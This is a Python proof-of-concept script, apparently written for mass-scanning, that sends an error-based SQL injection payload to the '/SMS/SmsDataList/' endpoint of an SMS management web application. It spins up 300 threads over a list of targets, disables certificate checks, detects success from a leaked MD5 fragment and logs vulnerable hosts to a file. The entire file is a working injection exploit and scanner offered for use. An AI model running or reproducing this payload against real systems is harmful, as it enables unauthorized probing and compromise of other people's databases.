import requests,re,argparse,time,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    banner = """
                                                              
         ______   ____    ____  _____      _____  ____   ____ 
     ___|\     \ |    |  |    ||\    \    /    /||    | |    |
    |    |\     \|    |  |    || \    \  /    / ||    | |    |
    |    |/____/||    | /    //|  \____\/    /  /|    | |    |
 ___|    \|   | ||    |/ _ _//  \ |    /    /  / |    | |    |
|    \    \___|/ |    |\    \'   \|___/    /  /  |    | |    |
|    |\     \    |    | \    \       /    /  /   |    | |    |
|\ ___\|_____|   |____|  \____\     /____/  /    |\___\_|____|
| |    |     |   |    |   |    |   |`    | /     | |    |    |
 \|____|_____|   |____|   |____|   |_____|/       \|____|____|
    \(    )/       \(       )/        )/             \(   )/  
     '    '         '       '         '               '   '   
                                              author:Skyu

    """
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("-u","--url",dest="url",type=str,help="please write link")
    parser.add_argument("-f","--file",dest="file",type=str,help="please write file\'path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for i in f.readlines():
                url_list.append(i.strip().replace("\n",""))
        mp = Pool(300)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")

def poc(target):
    payload_url = "/SMS/SmsDataList/?pageIndex=1&pageSize=30"
    url = target + payload_url
    headers={
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Content-Type": 'application/x-www-form-urlencoded',
            'Connection': 'Keep-Alive'
    }
    data="Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000'and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI"

    try:
        response = requests.post(url, headers=headers, data=data, verify=False)
        if response.status_code == 200 and 'dc3949ba59ab' in response.text:
            print(f"[+]该url存在SQL漏洞：{target}")
            with open("result.txt","a",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            print("[-]该url不存在sql注入漏洞")
    except Exception as e:
        print("[*]该url存在异常，请手动测试")



if __name__ == "__main__":
    main()